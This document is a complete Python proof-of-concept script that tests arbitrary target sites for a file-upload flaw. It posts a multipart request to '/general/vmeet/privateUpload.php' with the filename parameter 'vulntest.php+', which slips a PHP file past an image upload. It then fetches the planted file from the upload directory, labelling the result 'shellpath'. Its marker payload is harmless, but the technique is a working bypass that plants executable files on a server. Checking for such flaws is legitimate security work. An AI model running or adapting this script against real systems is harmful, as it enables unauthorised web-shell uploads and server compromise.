#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import json
import re
import time


urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/general/vmeet/privateUpload.php?fileName=vulntest.php+"
    burp0_headers = {"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarykBUoB5eZYrmXxgIg", "User-Agent": "Moziilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"}
    burp0_data = "------WebKitFormBoundarykBUoB5eZYrmXxgIg\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"cnvd.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nvulntest\r\n------WebKitFormBoundarykBUoB5eZYrmXxgIg--\r\n"
    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)
    if r.status_code == 200:
        shellpath = site + "/general/vmeet/upload/temp/vulntest.php"
        r2 = requests.get(shellpath, verify=False)
        if r2.status_code == 200 and "vulntest" in r2.text:
            return shellpath
    return ""
    
if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，文件上传后的路径为：", info)
    else:
        print("[-]漏洞不存在")
